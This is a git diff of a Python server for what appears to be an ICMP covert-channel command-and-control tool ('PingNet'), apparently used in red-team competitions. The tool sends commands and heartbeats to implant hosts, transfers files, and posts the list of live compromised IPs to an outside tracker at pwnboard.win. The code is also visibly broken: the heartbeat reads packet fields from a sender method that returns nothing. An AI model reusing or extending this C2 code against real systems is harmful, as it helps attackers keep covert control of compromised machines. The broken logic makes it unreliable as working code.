@@ -3,6 +3,8 @@ import csv
 import sys
 import threading
 import random
+import requests
+import json
 from db import Connector
 
 class Server:
@@ -46,6 +48,7 @@ class Server:
     def sender(self, dest, cmd, protype, protcode):
         print("DEST")
         #rpckt = sr1(IP(dst=self.iplook(dest))/ICMP(type=protype, code=protcode)/cmd)#Fix this to use the database instead
+        #return rpckt
 
     def send_cmd(self):
         #typ = random.randint(44,94)
@@ -56,12 +59,17 @@ class Server:
         self.sender(target, cmd, typ, code)
 
     def heartbeat(self):
+        alive = []
         ips = self.db.heart_ips_test()
         for ip in ips:
             print(ip[0])
             typ = 146
             code = 0
-            self.sender(ip, "abcdefghijklmnopqrstuvwxyz",typ,code)
+            pkt = self.sender(ip, "abcdefghijklmnopqrstuvwxyz",typ,code)
+            #Do if logic later
+            alive.append(str(pkt.getlayer(IP).src))
+        self.sendUpdate(alive, name="PingNet")
+        
     
     def file_transfer(self, fname):
         with open(fname, "rb") as fsend:
@@ -83,6 +91,20 @@ class Server:
         print(pkt.getlayer(ICMP).type)
         data = pkt.getlayer(ICMP).load.decode()
         print(data)
+    
+    def sendUpdate(self, ips, name="PingNet"):
+        host = "http://pwnboard.win/generic"
+        # Here ips is a list of IP addresses to update
+        # If we are only updating 1 IP, use "ip" and pass a string
+        data = {'ips': ips, 'type': name}
+        try:
+            req = requests.post(host, json=data, timeout=3)
+            print(req.text)
+            return True
+        except Exception as E:
+            print(E)
+            return False
+
 
 server = Server()
 server.heartbeat()
